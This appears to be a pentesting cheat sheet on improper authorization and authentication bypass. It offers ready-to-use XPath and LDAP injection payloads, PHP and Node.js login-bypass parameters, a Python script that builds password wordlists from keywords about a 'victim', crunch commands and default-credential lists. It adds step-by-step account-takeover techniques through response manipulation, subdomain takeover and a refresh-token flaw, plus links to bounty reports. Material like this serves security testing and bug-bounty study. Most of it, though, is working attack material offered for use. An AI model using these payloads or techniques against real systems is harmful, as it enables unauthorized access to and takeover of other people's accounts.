# CWE-285: Improper Authorization

#### **Easy Ways**

* Check for **comments** inside the page (scroll down and to the right?)
* Emails tricks

```jsx
yourname@wearehackerone.com
yourname@bugcrowd.com
lol@company.com@burbcollaboratorpayload.com
```

* Check if you can **directly access the restricted pages**
* Check to **not send the parameters** (do not send any or only 1)
* Check the **PHP comparisons error:** `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
* **Change content type to json** and send json values (bool true included)
  * If you get a response saying that POST is not supported you can try to send the **JSON in the body but with a GET request** with `Content-Type: application/json`
* Check nodejs potential parsing error (read [**this**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
  *   Nodejs will transform that payload to a query similar to the following one:

      ```
      SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` ``**password=password=1**;
      ```

      * which makes the password bit to be always true.
  * If you can send a JSON object you can send `"password":{"password": 1}` to bypass the login.
  * Remember that to bypass this login you still need to **know and send a valid username**.
  * **Adding `"stringifyObjects":true`** option when calling `mysql.createConnection` will eventually b**lock all unexpected behaviours when `Object` is passed** in the parameter.

#### **Default Credentials**

\*\*[https://github.com/ihebski/DefaultCreds-cheat-sheet\*\*](https://github.com/ihebski/DefaultCreds-cheat-sheet\*\*)

\*\*[http://www.phenoelit.org/dpl/dpl.html\*\*](http://www.phenoelit.org/dpl/dpl.html\*\*)

\*\*[http://www.vulnerabilityassessment.co.uk/passwordsC.htm\*\*](http://www.vulnerabilityassessment.co.uk/passwordsC.htm\*\*)

\*\*[https://192-168-1-1ip.mobi/default-router-passwords-list/\*\*](https://192-168-1-1ip.mobi/default-router-passwords-list/\*\*)

\*\*[https://datarecovery.com/rd/default-passwords/\*\*](https://datarecovery.com/rd/default-passwords/\*\*)

\*\*[https://bizuns.com/default-passwords-list\*\*](https://bizuns.com/default-passwords-list\*\*)

\*\*[https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv\*\*](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv\*\*)

\*\*[https://github.com/Dormidera/WordList-Compendium\*\*](https://github.com/Dormidera/WordList-Compendium\*\*)

\*\*[https://www.cirt.net/passwords\*\*](https://www.cirt.net/passwords\*\*)

\*\*[http://www.passwordsdatabase.com/\*\*](http://www.passwordsdatabase.com/\*\*)

\*\*[https://many-passwords.github.io/\*\*](https://many-passwords.github.io/\*\*)

\*\*[https://theinfocentric.com/\*\*](https://theinfocentric.com/\*\*)

#### **Common Combinations**

(root, admin, password, name of the tech, default user with one of these passwords).

Dictionarry attack using python script

*   Dictionary\_Attack\_Script.py

    ```python
    import numpy as np
    from itertools import permutations, product, chain
    import math
    import time

    def casing_count(word):
        """
        Counts the number of possible casings for a given word.
        """
        if word.isdigit():
            # If the word is a digit, it can only be represented in one casing.
            count = 1
        else:
            # Otherwise, the number of possible casings is 2 to the power of the word length.
            count = pow(2, len(word))
        return count

    def all_casings(input_string):
        """
        Generates all possible casings for a given string.
        """
        if not input_string:
            yield ""
        else:
            first = input_string[:1]
            if first.lower() == first.upper():
                # If the character is not a letter, keep it as is.
                for sub_casing in all_casings(input_string[1:]):
                    yield first + sub_casing
            else:
                # If the character is a letter, generate two casings: one lowercase and one uppercase.
                for sub_casing in all_casings(input_string[1:]):
                    yield first.lower() + sub_casing
                    yield first.upper() + sub_casing

    def perm_count(string_list):
        """
        Counts the total number of permutations for a given list of strings.
        """
        casing_counts = [casing_count(word) for word in string_list]
        total_permutations = np.product(casing_counts) * math.factorial(len(string_list))
        return total_permutations

    print("""

      _    __  _        _   ___  ___     
     | |_ /  \\| |_ __ _| |_( _ )( _ )_ _ 
     | ' \\ () |  _/ _` | / / _ \\/ _ \\ '_|
     |_||_\\__/ \\__\\__,_|_\\_\\___/\\___/_|  
                                         
    """)
    time.sleep(3)
    print("\\033[1;32m[+] OK,First let's start with keywords about the victim 👀 \\033[0m")
    # Ask the user for a list of phrases separated by commas.
    phrases = input("\\033[1;32m[+] Enter keywords separated by commas:\\033[0m \\n").split(',')
    phrases = [x.strip() for x in phrases]

    print("\\033[1;32m🚀 CALCULATING COMBINATIONS....\\033[0m")
    time.sleep(3)

    # Print the number of permutations for each combination of phrases.
    for i in range(1, len(phrases) + 1):
        phrases_subset = phrases[:i]
        word_counts = [casing_count(word) for word in phrases_subset]
        dictionary = dict(zip(phrases_subset, word_counts))
        total_permutations = perm_count(phrases_subset)
        print(f"{dictionary} = {total_permutations} permutations")

    # Generate all possible casings for each word in the list.
    all_casings_list = [set(all_casings(word)) for word in phrases]

    # Generate all possible permutations of the list of phrases with all possible casings.
    permutations_set = set()
    for i in range(1, len(phrases)+1):
        for element in product(*all_casings_list[:i]):
            for permutation in permutations(element):
                permutations_set.add(chain(permutation))

    # Convert the set of permutations to a list.
    permutations_list = [list(gen) for gen in permutations_set]

    print("\\033[1;32m✅ Saving our work in [passwords.txt] WORDLIST..... \\033[0m")
    time.sleep(5)
    # Write the list of permutations to a file.
    count = 0
    with open('passwords.txt', 'w') as file:
        for password in permutations_list:
            file.write("".join(password) + "\\n")
            count += 1
    # print number of passwords generated
    print("\\033[1;32m[+] Number of possible passwords:\\033[0m", count)
    print("\\033[1;32m                                     🙌 THAT'S IT !,YOU'RE DONE                \\033[0m")
    ```

Or using tools like **Crunc**

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

#### **SQL Login Bypass**

[https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

#### **NoSQL authentication Bypass**

[https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)

#### **XPath Injection authentication bypass**

```bash
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

#### **LDAP Injection authentication bypass**

```bash
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

#### Improper Microsoft SSO Configuration

1. The application returned an unusually large content-length (over 40,000 bytes!) on the redirection response.
2. The application was leaking its internal responses to _every_ request while sending the user to the redirection to the SSO
3. So, it was possible to tamper the responses and change the _`302 Found`_ header to _`200 OK`_ and **delete** the entire \*`Location* header`, **giving access to the whole application**

#### Changing Authentication Type to Null

```bash
- A quick analysis showed it used an md5 value of the supplied password value. 
- There was another interesting sign in the request: scode had an attribute as type valued with 2.
- I tried assigning the value to 1, which would accept the cleartext password. It worked! 
- So, brute force within cleartext values was possible. Not a big deal, but it was a sign I was on the right path. 
- What about assigning it to the null values? Or other values such as -1, 0 or 9999999999? Most of them returned an error code except value 0. 
- I tried several things with the attribute *0* but had no luck until I sent the password value as an empty value.
- I realized it was possible to access any account by simply supplying the usernames and empty passwords. 
It turned out to be quite a big bug
```

#### **PrevEsc Via Response manipulation**

```bash
# PrevEsc
1. Go to login Panel
2. Login With your Credentials
3. study the login process from Burp-suite logs
4. Understand how the server handles roles like user and admin 
5. try req/response manipulation to Prev-Esc for example manipulate parameters like [ role, ID, status code, false, true]
6. Play With the match and replace feature in Burp-suite
lol@sso.com → lol@gmail.com 
```

#### Authentication Bypass via Subdomain Takeover

Authentication Bypass on [sso.ubnt.com](http://sso.ubnt.com/) via Subdomain Takeover of [ping.ubnt.com](http://ping.ubnt.com/)

* A subdomain ([ping.ubnt.com](http://ping.ubnt.com/)) is pointing to the CDN hostname ([d2cnv2pop2xy4v.cloudfront.net](http://d2cnv2pop2xy4v.cloudfront.net/).) but has not been claimed yet.
* The Single-Sign-On (SSO) functionality sets the cookie domain attribute as "\[[domain=.ubnt.com](http://domain=.ubnt.com)]\([http://domain](http://domain)%[3D.ubnt.com/](http://3d.ubnt.com/))".

**Attack Scenario**

1. The attacker claims the CDN hostname [d2cnv2pop2xy4v.cloudfront.net](http://d2cnv2pop2xy4v.cloudfront.net/). and hosts own application.
2. A logged in user (\*.ubnt.com) visits the subdomain [ping.ubnt.com](http://ping.ubnt.com/) (unknowingly or lured by attacker) and the session cookies are transferred to and logged by [d2cnv2pop2xy4v.cloudfront.net](http://d2cnv2pop2xy4v.cloudfront.net/). (owned by attacker).
3. The attacker uses the session cookies to authenticate as victim user.

#### Refresh Token Endpoint Misconfiguration Leads to ATO

*   **vuln Explain**

    In this case, once a user logged into the application with valid credentials, it created a `Bearer Authentication token` used elsewhere in the application.

    This auth token expired after some time. Just before expiration, the application sent a request to the back-end server within the endpoint `/*refresh/tokenlogin*` containing the `valid auth token` in the headers and `username parameter` on the HTTP body section.

    Further testing revealed that deleting _`Authorization header`_ on the request and changing the _`username`_ parameter on the HTTP body created a new valid token for the supplied `username`. Using this exploit, an attacker with an anonymous profile could generate an authentication token for any user by just supplying their username.

Steps

1. Find Refresh Token Endpoint
2. Remove Bearer Header
3. change username
4. Get the token for any user in response

#### Remember Me Feature

* [Exploiting Remember Me Cookie For Account Takeover](https://gupta-bless.medium.com/exploiting-remember-me-cookie-for-account-takeover-4e8d5fd42d4b)
* [**Abuse of "Remember Me" functionality**](https://hackerone.com/reports/37822)
* [**Weakness in the remember me feature**](https://www.youtube.com/watch?v=cO0HPCyDAM0)
* [**Improper session handling**](https://github.com/pi-hole/AdminLTE/security/advisories/GHSA-33w4-xf7m-f82m)
* [**OTGv4**](https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/en/web\_application\_security\_testing/test\_remember\_password\_functionality\_otg-authn-005.html)

#### **Other Checks**

```bash
Check if you can enumerate usernames abusing the login functionality.
Check if auto-complete is active in the password/sensitive information forms input: <input autocomplete="false"
-Missing Secure or HTTPOnly Cookie Flag for Session Token
```

#### CMS-Based Access Problems

*   Attack Explain

    One popular CMS platform, Liferay, was used in an internal application in one case I examined. The application only had a single login page accessible without authentication, and all other pages were restricted on the application UI.

    For those not familiar with Liferay, the CMS uses portlets for application workflow, which have a parameter as _p\_p\_id_ within numeric numbers. For that application, it was possible to access the login portlet by changing the parameter to value _58._ On the normal login page, only the login form was accessible. However, by accessing the portlet directly, it was possible to reach the _Create Account_ functionality, which then allowed self-registration to access internal applications without proper authorization.

    Please note that while Liferay used this workflow before, its latest version uses portlet names instead of numeric ids. Still, it is possible to access other portlets by changing names as well.

Play with numerical parameters like _`p_p_id` change it to 58 or parameters that use username play with them_

#### **Weak Password Policy**

```python
Check If there is Features that should have password policy and it doesnt have one Like:
password Change 
Password Reset
or Wherever  You enter a Passw
- Allows users to create simple passwords
- Allows brute force attempts against user accounts
- Allows users to change their password without asking for password confirmation
- Allows users to change their account email without asking for password confirmation
- Discloses token or password in the URL
- GraphQL queries allow for many authentication attempts in a single request
- Lacking authentication for sensitive requests
```

#### Admin Panel

* [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist/blob/main/Admin%20panal/adminpanal.md)
* [default credentials](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#default-credentials)
* \*\*\[Admin Approval Bypass]\(https://hackerone.com/reports/1861487

## HackerOne Reports :

1. [Potential pre-auth RCE on Twitter VPN](https://hackerone.com/reports/591295) to Twitter - 1157 upvotes, $20160
2. [Improper Authentication - any user can login as other user with otp/logout & otp/login](https://hackerone.com/reports/921780) to Snapchat - 891 upvotes, $25000
3. [Subdomain Takeover to Authentication bypass](https://hackerone.com/reports/335330) to Roblox - 718 upvotes, $2500
4. [\[ RCE \] Through stopping the redirect in /admin/\* the attacker able to bypass Authentication And Upload Malicious File](https://hackerone.com/reports/683957) to [Mail.ru](http://mail.ru/) - 340 upvotes, $4000
5. [Shopify admin authentication bypass using partners.shopify.com](https://hackerone.com/reports/270981) to Shopify - 287 upvotes, $20000
6. [Bypass Password Authentication for updating email and phone number - Security Vulnerability](https://hackerone.com/reports/770504) to Twitter - 260 upvotes, $700
7. [Spring Actuator endpoints publicly available and broken authentication](https://hackerone.com/reports/838635) to LINE - 223 upvotes, $12500
8. [Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data](https://hackerone.com/reports/876295) to Starbucks - 221 upvotes, $4000
9. [Through blocking the redirect in /\* the attacker able to bypass Authentication To see Sensitive Data sush as Game Keys , Emails ,..](https://hackerone.com/reports/736273) to Razer - 196 upvotes, $1000
10. [Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com](https://hackerone.com/reports/219205) to Uber - 165 upvotes, $5000
11. [Web Authentication Endpoint Credentials Brute-Force Vulnerability](https://hackerone.com/reports/127844) to HackerOne - 151 upvotes, $1500
12. [2-factor authentication can be disabled when logged in without confirming account password](https://hackerone.com/reports/783258) to Localize - 144 upvotes, $500
13. [\[c-api.city-mobil.ru\] Client authentication bypass leads to information disclosure](https://hackerone.com/reports/772118) to [Mail.ru](http://mail.ru/) - 143 upvotes, $8000
14. [Incorrect param parsing in Digits web authentication](https://hackerone.com/reports/126522) to Twitter - 122 upvotes, $2520
15. [RCE/LFI on test Jenkins instance due to improper authentication flow](https://hackerone.com/reports/258117) to Snapchat - 102 upvotes, $5000
16. [Thailand - a small number of SMB CCTV footage backup servers were accessible without authentication.](https://hackerone.com/reports/417360) to Starbucks - 92 upvotes, $0
17. [User account compromised authentication bypass via oauth token impersonation](https://hackerone.com/reports/739321) to Picsart - 91 upvotes, $0
18. [SAML Authentication Bypass on uchat.uberinternal.com](https://hackerone.com/reports/223014) to Uber - 82 upvotes, $8500
19. [Account Takeover via SMS Authentication Flow](https://hackerone.com/reports/1245762) to Zenly - 82 upvotes, $1750

## write-ups

* [Touch ID authentication Bypass on evernote and dropbox iOS apps](https://medium.com/@pig.wig45/touch-id-authentication-bypass-on-evernote-and-dropbox-ios-apps-7985219767b2)
* [Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect](https://xpoc.pro/oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect/)
* [Two factor authentication bypass](https://gauravnarwani.com/two-factor-authentication-bypass/)
* [Instagram multi factor authentication bypass](https://medium.com/@vishnu0002/instagram-multi-factor-authentication-bypass-924d963325a1)
* [Authentication bypass in nodejs application](https://medium.com/@\_bl4de/authentication-bypass-in-nodejs-application-a-bug-bounty-story-d34960256402)
* [Symantec authentication Bypass](https://artkond.com/2018/10/10/symantec-authentication-bypass/)
* [Authentication bypass in CISCO meraki](https://blog.takemyhand.xyz/2018/06/authentication-bypass-in-cisco-meraki.html)
* [Slack SAML authentocation bypass](https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html)
* [Authentication bypass on UBER's SSO](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/)
* [Authentication Bypass on airbnb via oauth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/)
* [Inspect element leads to stripe account lockout authentication Bypass](https://www.jonbottarini.com/2017/04/03/inspect-element-leads-to-stripe-account-lockout-authentication-bypass/)
* [Authentication bypass on SSO ubnt.com](https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/)
